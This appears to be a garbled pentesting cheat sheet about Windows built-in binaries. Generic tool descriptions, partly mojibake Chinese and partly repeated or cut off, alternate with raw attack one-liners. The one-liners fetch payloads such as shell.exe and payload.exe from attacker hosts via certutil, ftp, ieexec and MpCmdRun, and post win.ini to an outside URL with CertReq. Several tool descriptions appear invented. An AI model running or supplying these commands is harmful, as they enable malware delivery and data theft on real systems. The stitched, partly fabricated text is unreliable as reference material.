CertReq [options] [request_file] [output_file]
```

- `options`: Specifies various options for the certificate request.
- `request_file`: Specifies the input file that contains the certificate request information.
- `output_file`: Specifies the output file where the resulting certificate will be saved.

## Examples

Here are some examples of how CertReq.exe can be used:

1. Generate a certificate request using a template:

```plaintext
CertReq -new -f template.inf -r -p "password" request.req
```

2. Submit a certificate request to a CA:

```plaintext
CertReq -submit -config "https://ca.example.com/certsrv" -attrib "CertificateTemplate:WebServer" request.req response.cer
```

3. Accept a certificate response and install the certificate:

```plaintext
CertReq -accept -machine response.cer
```

## Conclusion

CertReq.exe is a powerful command-line tool for managing certificates in a Windows environment. It provides various options for creating and submitting certificate requests, as well as accepting and installing certificate responses. System administrators and security professionals can leverage CertReq.exe to streamline the certificate management process and ensure the security of their Windows systems.
```
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
```
Certutil.exe æ˜¯ä¸€ä¸ª Windows å‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œç”¨äºæ“ä½œå’Œç®¡ç†è¯ä¹¦ã€è¯ä¹¦é¢å‘æœºæ„ (CA) å’Œè¯ä¹¦å­˜å‚¨ã€‚å®ƒæä¾›äº†è®¸å¤šåŠŸèƒ½ï¼ŒåŒ…æ‹¬æŸ¥çœ‹ã€å¯¼å‡ºã€å¯¼å…¥å’ŒéªŒè¯è¯ä¹¦ï¼Œä»¥åŠæ‰§è¡Œå…¶ä»–ä¸è¯ä¹¦ç›¸å…³çš„æ“ä½œã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ Certutil.exe å‘½ä»¤ï¼š

- **certutil -viewstore**ï¼šæŸ¥çœ‹è¯ä¹¦å­˜å‚¨ä¸­çš„è¯ä¹¦ã€‚
- **certutil -addstore**ï¼šå°†è¯ä¹¦æ·»åŠ åˆ°è¯ä¹¦å­˜å‚¨ã€‚
- **certutil -delstore**ï¼šä»è¯ä¹¦å­˜å‚¨ä¸­åˆ é™¤è¯ä¹¦ã€‚
- **certutil -exportPFX**ï¼šå°†è¯ä¹¦å¯¼å‡ºä¸º PFX æ–‡ä»¶ã€‚
- **certutil -importPFX**ï¼šä» PFX æ–‡ä»¶å¯¼å…¥è¯ä¹¦ã€‚
- **certutil -verify**ï¼šéªŒè¯è¯ä¹¦çš„æœ‰æ•ˆæ€§ã€‚
- **certutil -dump**ï¼šæ˜¾ç¤ºè¯ä¹¦çš„è¯¦ç»†ä¿¡æ¯ã€‚

è¦äº†è§£æ›´å¤š Certutil.exe å‘½ä»¤å’Œç”¨æ³•ï¼Œè¯·å‚è€ƒ Microsoft å®˜æ–¹æ–‡æ¡£ã€‚
```
certutil.exe -urlcache -split -f "http://10.10.14.13:8000/shell.exe" s.exe
```
# Basic CMD for Pentesters

## Introduction

This document provides a list of basic CMD commands that can be useful for pentesters during their engagements. These commands can help in various tasks such as information gathering, privilege escalation, lateral movement, and persistence.

## CMD Commands

### 1. Tasklist

The `tasklist` command displays a list of all running processes on the system. This can be useful for identifying suspicious or malicious processes.

```plaintext
tasklist
```

### 2. Netstat

The `netstat` command displays active network connections, listening ports, and related information. It can help identify open ports and established connections.

```plaintext
netstat -ano
```

### 3. Ipconfig

The `ipconfig` command displays the IP configuration for all network interfaces on the system. It can be used to identify the IP address, subnet mask, and default gateway.

```plaintext
ipconfig /all
```

### 4. Net

The `net` command is used for various network-related tasks. Some useful subcommands include:

- `net user` - Displays user accounts on the system.
- `net group` - Displays group information.
- `net localgroup` - Displays local group information.
- `net share` - Displays shared resources.

```plaintext
net user
```

### 5. Systeminfo

The `systeminfo` command displays detailed information about the system, including the operating system version, hardware information, and installed patches.

```plaintext
systeminfo
```

### 6. Reg

The `reg` command is used to manage the Windows Registry. Some useful subcommands include:

- `reg query` - Displays the values and subkeys of a specified registry key.
- `reg add` - Adds a new registry entry.
- `reg delete` - Deletes a registry entry.
- `reg export` - Exports a registry key to a file.

```plaintext
reg query HKLM\Software
```

### 7. Schtasks

The `schtasks` command is used to manage scheduled tasks on the system. It can be used to create, modify, or delete scheduled tasks.

```plaintext
schtasks /query /fo LIST
```

### 8. Netsh

The `netsh` command is used to configure and monitor network settings. Some useful subcommands include:

- `netsh firewall` - Manages the Windows Firewall.
- `netsh wlan` - Manages wireless network settings.
- `netsh interface` - Manages network interfaces.

```plaintext
netsh firewall show state
```

### 9. WMIC

The `wmic` command provides a command-line interface to the Windows Management Instrumentation (WMI) infrastructure. It can be used to retrieve information about various system components.

```plaintext
wmic process get name, processid
```

### 10. Taskkill

The `taskkill` command is used to terminate a running process. It can be used to forcefully terminate a process that is not responding or is malicious.

```plaintext
taskkill /f /pid <process_id>
```

## Conclusion

These basic CMD commands can be helpful for pentesters during their engagements. However, it is important to note that these commands should be used responsibly and ethically, following all applicable laws and regulations.
```
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
```
Diantz.exe
```
diantz.exe \\remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab
```
# Esentutl.exe

`Esentutl.exe` æ˜¯ä¸€ä¸ªç”¨äºç®¡ç†å’Œç»´æŠ¤ Windows æ“ä½œç³»ç»Ÿä¸­çš„ Extensible Storage Engine (ESE) æ•°æ®åº“çš„å‘½ä»¤è¡Œå·¥å…·ã€‚ESE æ˜¯ä¸€ç§åµŒå…¥å¼æ•°æ®åº“å¼•æ“ï¼Œå¹¿æ³›ç”¨äº Windows ç³»ç»Ÿä¸­çš„è®¸å¤šåº”ç”¨ç¨‹åºï¼Œå¦‚ Active Directoryã€Windows Update å’Œ Windows Searchã€‚

## åŸºæœ¬ç”¨æ³•

ä»¥ä¸‹æ˜¯ `Esentutl.exe` çš„ä¸€äº›å¸¸ç”¨å‘½ä»¤å’Œç”¨æ³•ï¼š

### æ£€æŸ¥æ•°æ®åº“çŠ¶æ€

```plaintext
esentutl /mh <database_file>
```

æ­¤å‘½ä»¤ç”¨äºæ£€æŸ¥æŒ‡å®šæ•°æ®åº“æ–‡ä»¶çš„çŠ¶æ€ï¼ŒåŒ…æ‹¬æ•°æ®åº“çš„ç‰ˆæœ¬ã€æ—¥å¿—æ–‡ä»¶çš„çŠ¶æ€ä»¥åŠæ•°æ®åº“çš„ä¸€è‡´æ€§ã€‚

### ä¿®å¤æ•°æ®åº“

```plaintext
esentutl /p <database_file>
```

æ­¤å‘½ä»¤ç”¨äºä¿®å¤æŒ‡å®šçš„æ•°æ®åº“æ–‡ä»¶ã€‚ä¿®å¤è¿‡ç¨‹å°†å°è¯•æ¢å¤æŸåçš„æ•°æ®åº“æ–‡ä»¶ï¼Œå¹¶å°†å…¶ç½®äºä¸€è‡´çš„çŠ¶æ€ã€‚

### æ¢å¤æ•°æ®åº“

```plaintext
esentutl /r <log_file> /l <log_folder> /d <database_folder> /i
```

æ­¤å‘½ä»¤ç”¨äºä»æ—¥å¿—æ–‡ä»¶å’Œæ•°æ®åº“æ–‡ä»¶çš„å¤‡ä»½ä¸­æ¢å¤æ•°æ®åº“ã€‚éœ€è¦æŒ‡å®šæ—¥å¿—æ–‡ä»¶ã€æ—¥å¿—æ–‡ä»¶å¤¹å’Œæ•°æ®åº“æ–‡ä»¶å¤¹çš„è·¯å¾„ã€‚

### å¤‡ä»½æ•°æ®åº“

```plaintext
esentutl /y <database_file> /d <backup_folder>
```

æ­¤å‘½ä»¤ç”¨äºåˆ›å»ºæ•°æ®åº“æ–‡ä»¶çš„å¤‡ä»½ã€‚éœ€è¦æŒ‡å®šæ•°æ®åº“æ–‡ä»¶å’Œå¤‡ä»½æ–‡ä»¶å¤¹çš„è·¯å¾„ã€‚

## æ³¨æ„äº‹é¡¹

- åœ¨ä½¿ç”¨ `Esentutl.exe` ä¹‹å‰ï¼Œè¯·ç¡®ä¿å·²ç»å¤‡ä»½äº†ç›¸å…³çš„æ•°æ®åº“æ–‡ä»¶å’Œæ—¥å¿—æ–‡ä»¶ã€‚
- åœ¨æ‰§è¡Œä¿®å¤å’Œæ¢å¤æ“ä½œä¹‹å‰ï¼Œå»ºè®®å…ˆåœæ­¢ä¸æ•°æ®åº“ç›¸å…³çš„æœåŠ¡å’Œåº”ç”¨ç¨‹åºã€‚
- ä½¿ç”¨ `Esentutl.exe` è¿›è¡Œæ•°æ®åº“æ“ä½œéœ€è¦ç®¡ç†å‘˜æƒé™ã€‚

æ›´å¤šå…³äº `Esentutl.exe` çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ã€‚
```
esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o
```
## Expand.exe

`Expand.exe` æ˜¯ä¸€ä¸ª Windows å‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œç”¨äºè§£å‹ç¼©æ–‡ä»¶ã€‚å®ƒå¯ä»¥å°†å‹ç¼©æ–‡ä»¶ï¼ˆå¦‚ `.cab` æ–‡ä»¶ï¼‰è§£å‹ç¼©åˆ°æŒ‡å®šçš„ç›®å½•ä¸­ã€‚

### è¯­æ³•

```plaintext
expand.exe [-r] source destination
```

### å‚æ•°

- `-r`ï¼šå¯é€‰å‚æ•°ï¼Œç”¨äºé€’å½’åœ°è§£å‹ç¼©æºæ–‡ä»¶å¤¹ä¸­çš„æ‰€æœ‰æ–‡ä»¶ã€‚

- `source`ï¼šè¦è§£å‹ç¼©çš„æ–‡ä»¶è·¯å¾„ã€‚

- `destination`ï¼šè§£å‹ç¼©æ–‡ä»¶çš„ç›®æ ‡è·¯å¾„ã€‚

### ç¤ºä¾‹

```plaintext
expand.exe -r C:\archive.cab C:\extracted_files
```

ä»¥ä¸Šç¤ºä¾‹å°†é€’å½’åœ°è§£å‹ç¼© `C:\archive.cab` æ–‡ä»¶ä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå¹¶å°†å…¶è§£å‹ç¼©åˆ° `C:\extracted_files` ç›®å½•ä¸­ã€‚
```
expand \\webdav\folder\file.bat c:\ADS\file.bat
```
# Extrac32.exe

`Extrac32.exe` æ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªå‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œç”¨äºè§£å‹ç¼©æ–‡ä»¶ã€‚å®ƒå¯ä»¥è§£å‹ç¼© `.cab` æ–‡ä»¶ï¼Œè¿™æ˜¯ä¸€ç§å¸¸è§çš„å‹ç¼©æ–‡ä»¶æ ¼å¼ã€‚

## è¯­æ³•

```plaintext
extrac32 [/Y] [/A] [/D] [/L] [/Q] [/R] [/T:folder] [/X] [/Z] source destination
```

## å‚æ•°

- `/Y`ï¼šåœ¨è§£å‹ç¼©æ—¶ä¸æç¤ºç¡®è®¤ã€‚
- `/A`ï¼šå°†æ–‡ä»¶è§£å‹ç¼©åˆ°æŒ‡å®šçš„æ–‡ä»¶å¤¹ä¸­ã€‚
- `/D`ï¼šåœ¨è§£å‹ç¼©æ—¶æ˜¾ç¤ºè¯¦ç»†çš„è¿›åº¦ä¿¡æ¯ã€‚
- `/L`ï¼šå°†æ–‡ä»¶è§£å‹ç¼©åˆ°æŒ‡å®šçš„æ–‡ä»¶å¤¹ä¸­ï¼Œä½†ä¸åˆ›å»ºæ–‡ä»¶å¤¹ã€‚
- `/Q`ï¼šåœ¨è§£å‹ç¼©æ—¶ä¸æ˜¾ç¤ºä»»ä½•ä¿¡æ¯ã€‚
- `/R`ï¼šåœ¨è§£å‹ç¼©æ—¶è¦†ç›–ç°æœ‰çš„æ–‡ä»¶ã€‚
- `/T:folder`ï¼šå°†æ–‡ä»¶è§£å‹ç¼©åˆ°æŒ‡å®šçš„æ–‡ä»¶å¤¹ä¸­ã€‚
- `/X`ï¼šåœ¨è§£å‹ç¼©æ—¶ä¸ä¿ç•™æºæ–‡ä»¶çš„è·¯å¾„ã€‚
- `/Z`ï¼šåœ¨è§£å‹ç¼©æ—¶æ˜¾ç¤ºè¯¦ç»†çš„è¿›åº¦ä¿¡æ¯ã€‚

## ç¤ºä¾‹

```plaintext
extrac32 /Y /A /D /R /T:C:\temp /Z C:\archive.cab C:\destination
```

æ­¤å‘½ä»¤å°†è§£å‹ç¼© `C:\archive.cab` æ–‡ä»¶åˆ° `C:\destination` æ–‡ä»¶å¤¹ä¸­ï¼Œå¹¶è¦†ç›–ç°æœ‰çš„æ–‡ä»¶ã€‚è§£å‹ç¼©è¿‡ç¨‹ä¸­å°†æ˜¾ç¤ºè¯¦ç»†çš„è¿›åº¦ä¿¡æ¯ï¼Œå¹¶å°†æºæ–‡ä»¶è§£å‹ç¼©åˆ° `C:\temp` æ–‡ä»¶å¤¹ä¸­ã€‚
```
extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
```
## Findstr.exe

`findstr.exe` æ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºåœ¨æ–‡ä»¶ä¸­æœç´¢æŒ‡å®šçš„å­—ç¬¦ä¸²ã€‚å®ƒå¯ä»¥ç”¨äºæŸ¥æ‰¾æ–‡æœ¬æ–‡ä»¶ä¸­çš„ç‰¹å®šå†…å®¹ï¼Œä¹Ÿå¯ä»¥ç”¨äºåœ¨å¤šä¸ªæ–‡ä»¶ä¸­æœç´¢åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚

### è¯­æ³•

```plaintext
findstr [/b] [/e] [/l] [/r] [/s] [/i] [/x] [/v] [/n] [/m] [/o] [/p] [/g:File] [/f:File] [/c:String] [/d:DirList] [/a:ColorAttribute] [Strings] [[Drive:][Path] FileName[ ...]]
```

### å‚æ•°

- `/b`ï¼šåŒ¹é…ä»¥æŒ‡å®šå­—ç¬¦ä¸²å¼€å¤´çš„è¡Œã€‚
- `/e`ï¼šåŒ¹é…ä»¥æŒ‡å®šå­—ç¬¦ä¸²ç»“å°¾çš„è¡Œã€‚
- `/l`ï¼šå°†æœç´¢æ¨¡å¼è§†ä¸ºå­—é¢å€¼ï¼Œè€Œä¸æ˜¯æ­£åˆ™è¡¨è¾¾å¼ã€‚
- `/r`ï¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æœç´¢æ¨¡å¼ã€‚
- `/s`ï¼šåœ¨æŒ‡å®šç›®å½•åŠå…¶å­ç›®å½•ä¸­é€’å½’æœç´¢ã€‚
- `/i`ï¼šå¿½ç•¥å¤§å°å†™è¿›è¡ŒåŒ¹é…ã€‚
- `/x`ï¼šä»…åŒ¹é…æ•´ä¸ªè¡Œï¼Œè€Œä¸æ˜¯éƒ¨åˆ†åŒ¹é…ã€‚
- `/v`ï¼šä»…æ˜¾ç¤ºä¸åŒ¹é…çš„è¡Œã€‚
- `/n`ï¼šåœ¨æ¯è¡Œå‰æ˜¾ç¤ºè¡Œå·ã€‚
- `/m`ï¼šä»…æ˜¾ç¤ºåŒ…å«åŒ¹é…é¡¹çš„æ–‡ä»¶åã€‚
- `/o`ï¼šåœ¨æ¯ä¸ªåŒ¹é…é¡¹å‰æ˜¾ç¤ºåç§»é‡ã€‚
- `/p`ï¼šä»…æ˜¾ç¤ºåŒ…å«åŒ¹é…é¡¹çš„æ–‡ä»¶åï¼Œè€Œä¸æ˜¾ç¤ºåŒ¹é…çš„è¡Œã€‚
- `/g:File`ï¼šä»æŒ‡å®šçš„æ–‡ä»¶ä¸­è·å–æœç´¢å­—ç¬¦ä¸²ã€‚
- `/f:File`ï¼šä»æŒ‡å®šçš„æ–‡ä»¶ä¸­è·å–æœç´¢æ–‡ä»¶åˆ—è¡¨ã€‚
- `/c:String`ï¼šæŒ‡å®šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚
- `/d:DirList`ï¼šåœ¨æŒ‡å®šçš„ç›®å½•åˆ—è¡¨ä¸­æœç´¢ã€‚
- `/a:ColorAttribute`ï¼šæŒ‡å®šè¾“å‡ºæ–‡æœ¬çš„é¢œè‰²å±æ€§ã€‚

### ç¤ºä¾‹

- åœ¨æ–‡ä»¶ä¸­æœç´¢åŒ…å«æŒ‡å®šå­—ç¬¦ä¸²çš„è¡Œï¼š

```plaintext
findstr "search_string" filename.txt
```

- åœ¨å¤šä¸ªæ–‡ä»¶ä¸­æœç´¢åŒ…å«æŒ‡å®šå­—ç¬¦ä¸²çš„è¡Œï¼š

```plaintext
findstr "search_string" file1.txt file2.txt file3.txt
```

- åœ¨æŒ‡å®šç›®å½•åŠå…¶å­ç›®å½•ä¸­é€’å½’æœç´¢åŒ…å«æŒ‡å®šå­—ç¬¦ä¸²çš„è¡Œï¼š

```plaintext
findstr /s "search_string" C:\path\to\directory
```

- ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æœç´¢æ¨¡å¼ï¼š

```plaintext
findstr /r "regex_pattern" filename.txt
```

- ä»æ–‡ä»¶ä¸­è·å–æœç´¢å­—ç¬¦ä¸²ï¼š

```plaintext
findstr /g:search_strings.txt filename.txt
```

- ä»æ–‡ä»¶ä¸­è·å–æœç´¢æ–‡ä»¶åˆ—è¡¨ï¼š

```plaintext
findstr /f:file_list.txt "search_string"
```

- å¿½ç•¥å¤§å°å†™è¿›è¡ŒåŒ¹é…ï¼š

```plaintext
findstr /i "search_string" filename.txt
```

- ä»…åŒ¹é…ä»¥æŒ‡å®šå­—ç¬¦ä¸²å¼€å¤´çš„è¡Œï¼š

```plaintext
findstr /b "search_string" filename.txt
```

- ä»…åŒ¹é…ä»¥æŒ‡å®šå­—ç¬¦ä¸²ç»“å°¾çš„è¡Œï¼š

```plaintext
findstr /e "search_string" filename.txt
```

- ä»…æ˜¾ç¤ºä¸åŒ¹é…çš„è¡Œï¼š

```plaintext
findstr /v "search_string" filename.txt
```

- åœ¨æ¯è¡Œå‰æ˜¾ç¤ºè¡Œå·ï¼š

```plaintext
findstr /n "search_string" filename.txt
```

- ä»…æ˜¾ç¤ºåŒ…å«åŒ¹é…é¡¹çš„æ–‡ä»¶åï¼š

```plaintext
findstr /m "search_string" filename.txt
```

- åœ¨æ¯ä¸ªåŒ¹é…é¡¹å‰æ˜¾ç¤ºåç§»é‡ï¼š

```plaintext
findstr /o "search_string" filename.txt
```

- ä»…æ˜¾ç¤ºåŒ…å«åŒ¹é…é¡¹çš„æ–‡ä»¶åï¼Œè€Œä¸æ˜¾ç¤ºåŒ¹é…çš„è¡Œï¼š

```plaintext
findstr /p "search_string" filename.txt
```

- æŒ‡å®šè¾“å‡ºæ–‡æœ¬çš„é¢œè‰²å±æ€§ï¼š

```plaintext
findstr /a:ColorAttribute "search_string" filename.txt
```

### æ³¨æ„äº‹é¡¹

- `findstr.exe` é»˜è®¤æƒ…å†µä¸‹åŒºåˆ†å¤§å°å†™ï¼Œå¦‚æœéœ€è¦å¿½ç•¥å¤§å°å†™è¿›è¡ŒåŒ¹é…ï¼Œå¯ä»¥ä½¿ç”¨ `/i` å‚æ•°ã€‚
- `findstr.exe` æ”¯æŒä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæœç´¢ï¼Œå¯ä»¥ä½¿ç”¨ `/r` å‚æ•°ã€‚
- `findstr.exe` å¯ä»¥åœ¨æ–‡æœ¬æ–‡ä»¶ä¸­æœç´¢æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥åœ¨å¤šä¸ªæ–‡ä»¶ä¸­æœç´¢åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚
- `findstr.exe` å¯ä»¥é€’å½’æœç´¢æŒ‡å®šç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚
- `findstr.exe` å¯ä»¥ä»æ–‡ä»¶ä¸­è·å–æœç´¢å­—ç¬¦ä¸²æˆ–æœç´¢æ–‡ä»¶åˆ—è¡¨ã€‚
- `findstr.exe` å¯ä»¥æ ¹æ®éœ€è¦æ˜¾ç¤ºä¸åŒ¹é…çš„è¡Œã€è¡Œå·ã€æ–‡ä»¶åç­‰ä¿¡æ¯ã€‚
```
findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe
```
# Ftp.exe

`ftp.exe` is a command-line utility in Windows that allows users to transfer files to and from a remote computer using the File Transfer Protocol (FTP). It is a built-in tool that comes with the Windows operating system.

## Syntax

The basic syntax for using `ftp.exe` is as follows:

```plaintext
ftp [-v] [-d] [-i] [-n] [-g] [-s:filename] [-a] [-w:windowsize] [-A] [host]
```

## Options

Here are some commonly used options with `ftp.exe`:

- `-v`: Enables verbose mode, which displays detailed information about the FTP connection and file transfers.
- `-d`: Enables debugging mode, which provides additional information for troubleshooting purposes.
- `-i`: Disables interactive mode, which suppresses prompts for user confirmation during file transfers.
- `-n`: Suppresses the automatic login feature, allowing the user to manually log in to the FTP server.
- `-g`: Disables filename globbing, which prevents wildcard characters from being expanded in file names.
- `-s:filename`: Specifies a text file containing FTP commands to be executed automatically.
- `-a`: Uses ASCII mode for file transfers, which is suitable for transferring text files.
- `-w:windowsize`: Specifies the size of the receive window for data transfers.
- `-A`: Enables anonymous FTP login, allowing users to log in without providing a username or password.

## Examples

Here are some examples of how to use `ftp.exe`:

1. Connect to an FTP server:

```plaintext
ftp example.com
```

2. Upload a file to the FTP server:

```plaintext
put filename
```

3. Download a file from the FTP server:

```plaintext
get filename
```

4. List files and directories on the FTP server:

```plaintext
ls
```

5. Change the current directory on the FTP server:

```plaintext
cd directory
```

6. Disconnect from the FTP server:

```plaintext
bye
```

## Conclusion

`ftp.exe` is a useful command-line tool for transferring files to and from remote computers using FTP. By understanding its syntax and options, you can effectively use this utility for various file transfer operations.
```
cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
```
GfxDownloadWrapper.exe
```
C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "URL" "DESTINATION FILE"
```
# Hh.exe

`hh.exe` is a Windows executable that is used to launch the Windows Help and Support Center. It is commonly found in the `C:\Windows` directory.

## Usage

To launch the Help and Support Center using `hh.exe`, open a command prompt and run the following command:

```
hh.exe helpctr
```

This will open the Help and Support Center window, where you can search for help topics and access various Windows support resources.

## Command-Line Options

`hh.exe` supports several command-line options that can be used to customize its behavior. Here are some commonly used options:

- `/mapid <mapid>`: Opens the specified Help topic directly.
- `/url <URL>`: Opens the specified URL in the default browser.
- `/find <text>`: Searches for the specified text in the Help content.
- `/index <keyword>`: Displays the Help topics that match the specified keyword.
- `/show <window>`: Displays the specified window in the Help and Support Center.

For example, to open a specific Help topic with the map ID `1234`, you can use the following command:

```
hh.exe helpctr /mapid 1234
```

## Security Considerations

`hh.exe` is a legitimate Windows executable and is not inherently malicious. However, like any other executable, it can be abused by attackers to execute arbitrary commands or launch malicious payloads.

To mitigate the risk of abuse, it is important to ensure that `hh.exe` is only executed from trusted locations and that the command-line options are properly validated. Additionally, keeping the operating system and software up to date with the latest security patches can help prevent potential vulnerabilities from being exploited.

## References

- [Microsoft Docs: Hh.exe Command-Line Options](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/hh398365(v=vs.85))
```
HH.exe http://some.url/script.ps1
```
# Ieexec.exe

`ieexec.exe` is a command-line utility in Windows that allows you to execute Internet Explorer processes with specific options. It is commonly used by pentesters and hackers to perform various tasks related to web browsing and exploitation.

## Usage

The basic syntax of `ieexec.exe` is as follows:

```
ieexec.exe [options] [URL]
```

- `[options]`: Specifies the command-line options for `ieexec.exe`. These options can be used to control the behavior of Internet Explorer processes.
- `[URL]`: Specifies the URL of the website to be opened in Internet Explorer.

## Examples

Here are some examples of how `ieexec.exe` can be used:

1. Open a website in Internet Explorer:
   ```
   ieexec.exe https://example.com
   ```

2. Open a website in Internet Explorer with specific options:
   ```
   ieexec.exe --new-window --no-proxy-server https://example.com
   ```

3. Execute JavaScript code in Internet Explorer:
   ```
   ieexec.exe --script "alert('Hello, world!');"
   ```

4. Take a screenshot of a website in Internet Explorer:
   ```
   ieexec.exe --screenshot screenshot.png https://example.com
   ```

## Conclusion

`ieexec.exe` is a useful tool for pentesters and hackers who need to interact with Internet Explorer processes from the command line. It provides various options for controlling the behavior of Internet Explorer and performing tasks such as opening websites, executing JavaScript code, and taking screenshots.
```
ieexec.exe http://x.x.x.x:8080/bypass.exe
```
# Makecab.exe

Makecab.exe is a command-line tool in Windows that is used to create cabinet (.cab) files. Cabinet files are compressed archives that can contain multiple files and folders. This tool is commonly used for packaging and compressing files for distribution or installation purposes.

## Syntax

```
makecab [/V[n]] [/D var=value ...] [/L dir] source [destination]
```

## Parameters

- `/V[n]`: Specifies the verbosity level of the output. Use `/V` for normal output and `/Vn` for more verbose output (where `n` is a number from 1 to 3).
- `/D var=value`: Defines a variable and its value for use in the makecab directive section.
- `/L dir`: Specifies the directory where the output files will be placed.
- `source`: Specifies the file or files to be compressed.
- `destination`: Specifies the name of the cabinet file to be created.

## Examples

1. Compress a single file:

```
makecab file.txt
```

2. Compress multiple files:

```
makecab file1.txt file2.txt file3.txt
```

3. Specify the output directory:

```
makecab /L C:\Output file.txt
```

4. Set verbosity level to 2:

```
makecab /V2 file.txt
```

## Additional Information

- The makecab directive section allows you to specify additional instructions for the compression process, such as file attributes, disk names, and more.
- Cabinet files can be extracted using the `expand` command or by double-clicking on them in Windows Explorer.
```
makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
```
`MpCmdRun.exe` æ˜¯ Windows Defender çš„å‘½ä»¤è¡Œå®ç”¨ç¨‹åºã€‚å®ƒå…è®¸ç”¨æˆ·åœ¨å‘½ä»¤è¡Œç•Œé¢ä¸‹æ‰§è¡Œä¸ Windows Defender ç›¸å…³çš„æ“ä½œï¼Œå¦‚æ‰«ææ–‡ä»¶ã€æ›´æ–°ç—…æ¯’å®šä¹‰å’Œé…ç½® Windows Defender è®¾ç½®ç­‰ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ `MpCmdRun.exe` å‘½ä»¤ï¼š

- æ‰«ææ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ï¼š`MpCmdRun.exe -Scan -ScanType 3 -File <è·¯å¾„>`
- æ‰«æå…¨ç›˜ï¼š`MpCmdRun.exe -Scan -ScanType 2`
- æ›´æ–°ç—…æ¯’å®šä¹‰ï¼š`MpCmdRun.exe -SignatureUpdate`
- æŸ¥çœ‹ç—…æ¯’æ‰«ææ—¥å¿—ï¼š`MpCmdRun.exe -GetFiles -ScanType 3 -LogFile <æ—¥å¿—æ–‡ä»¶è·¯å¾„>`
- ç¦ç”¨å®æ—¶ä¿æŠ¤ï¼š`MpCmdRun.exe -DisableRealtimeMonitoring`
- å¯ç”¨å®æ—¶ä¿æŠ¤ï¼š`MpCmdRun.exe -EnableRealtimeMonitoring`
- æŸ¥çœ‹ Windows Defender è®¾ç½®ï¼š`MpCmdRun.exe -GetFiles -ScanType 3 -LogFile <æ—¥å¿—æ–‡ä»¶è·¯å¾„>`

è¯·æ³¨æ„ï¼Œæ‰§è¡Œ `MpCmdRun.exe` å‘½ä»¤éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚
```
MpCmdRun.exe -DownloadFile -url <URL> -path <path> //Windows Defender executable
```
# Replace.exe

`Replace.exe` is a command-line tool in Windows that allows you to replace files in a specified directory. It can be useful for various purposes, including replacing system files, modifying configurations, or performing other file-related operations.

## Syntax

The syntax for using `Replace.exe` is as follows:

```plaintext
replace.exe <source_file> <destination_file> [/A] [/P] [/R] [/W]
```

- `<source_file>`: Specifies the file to be copied.
- `<destination_file>`: Specifies the location and name of the new file.
- `/A`: Adds the file attributes of the source file to the destination file.
- `/P`: Prompts for confirmation before replacing an existing file.
- `/R`: Replaces read-only files.
- `/W`: Waits for you to insert a disk before replacing files.

## Examples

Here are some examples of how to use `Replace.exe`:

1. Replace a file without prompting for confirmation:

```plaintext
replace.exe C:\path\to\source\file.txt C:\path\to\destination\file.txt /P
```

2. Replace a file and add the file attributes of the source file to the destination file:

```plaintext
replace.exe C:\path\to\source\file.txt C:\path\to\destination\file.txt /A
```

3. Replace a read-only file:

```plaintext
replace.exe C:\path\to\source\file.txt C:\path\to\destination\file.txt /R
```

4. Replace a file and wait for disk insertion:

```plaintext
replace.exe C:\path\to\source\file.txt C:\path\to\destination\file.txt /W
```

Note: Make sure to replace `C:\path\to\source\file.txt` with the actual path and name of the source file, and `C:\path\to\destination\file.txt` with the actual path and name of the destination file.

## Conclusion

`Replace.exe` is a powerful command-line tool in Windows that allows you to replace files in a specified directory. By understanding its syntax and options, you can efficiently perform file replacement operations as needed.
```
replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
```
# Basic CMD for Pentesters

## Introduction

This document provides a list of basic CMD commands that can be useful for pentesters during their engagements. These commands can help in gathering information, performing reconnaissance, and executing various tasks on a Windows system.

## CMD Commands

### 1. Tasklist

The `tasklist` command displays a list of all running processes on the system. This can be useful for identifying any suspicious or malicious processes.

```plaintext
tasklist
```

### 2. Netstat

The `netstat` command displays active network connections, listening ports, and related information. It can help in identifying any unauthorized network connections or open ports.

```plaintext
netstat -ano
```

### 3. Ipconfig

The `ipconfig` command displays the IP configuration of all network interfaces on the system. It can be used to gather information about the network settings of the target system.

```plaintext
ipconfig /all
```

### 4. Net

The `net` command is used for various network-related operations. Some useful subcommands include:

- `net user` - Displays information about user accounts on the system.
- `net group` - Displays information about user groups on the system.
- `net localgroup` - Displays information about local groups on the system.

```plaintext
net user
net group
net localgroup
```

### 5. Systeminfo

